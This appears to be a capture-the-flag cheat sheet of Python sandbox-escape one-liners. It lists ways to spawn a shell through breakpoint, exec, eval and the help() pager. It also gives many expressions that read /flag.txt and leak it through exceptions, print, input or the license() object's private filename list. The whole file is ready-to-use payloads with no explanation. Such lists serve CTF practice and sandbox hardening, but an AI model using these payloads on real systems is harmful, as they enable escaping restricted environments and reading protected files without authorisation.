```py
breakpoint() # pdb -> import os; os.system("sh")
exec(input()) # import os; os.system("sh")
eval(input()) # __import__("os").system("sh")

help() # less pager -> !/bin/sh
help() # less pager -> :e/flag.txt

assert len(set( [ *open("/flag.txt"), open("/flag.txt").read(), set(open("/flag.txt")).pop() ] )) == 1

# to stderr
int(*open("/flag.txt"))
float(*open("/flag.txt"))
complex(*open("/flag.txt"))
exit(set(open("/flag.txt")))
exit(*open("/flag.txt"))
open(*open("/flag.txt"))
compile(".","/flag.txt","exec")
raise Exception(*open("/flag.txt"))

# to stdout
help(*open("/flag.txt"))
print(*open("/flag.txt"))
type("", (), {"__init__": lambda s: print(open("flag.txt").read())})()
memoryview(open("flag.txt", "rb").read()).tobytes()

# to stdin
input(*open("/flag.txt"))

# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license
license._Printer__filenames = ['/flag.txt']; license()
[license() for _ in [license._Printer__filenames in [['/flag.txt']]]]
```
